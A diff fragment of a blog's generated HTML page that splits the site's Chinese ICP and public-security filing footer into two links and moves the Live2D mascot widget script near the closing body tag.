                         var todayYear = today.getFullYear();
                         var todayMonth = today.getMonth() + 1;
@@ -1150,7 +1060,7 @@ strcpy(buffer, variable);
             
                 <span id="icp"><img src="/medias/icp.png"
                                     style="vertical-align: text-bottom;"/>
-                <a href="https://www.beian.gov.cn" target="_blank">渝ICP备2024047956号 | 渝公网安备50011702501074号</a>
+                <a href="https://beian.miit.gov.cn/" target="_blank">渝ICP备2024047956号-1</a> | <a href="https://www.beian.gov.cn" target="_blank">渝公网安备50011702501074号</a>
             </span>
             
         </div>
@@ -1405,8 +1315,14 @@ $(function () {
     
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
+
+
+    
+    <script src="/live2dw/lib/L2Dwidget.min.js"></script>
+    <script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script>
+    
     <script src="/js/FunnyTitle.js"></script>
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</body>
 
 </html>
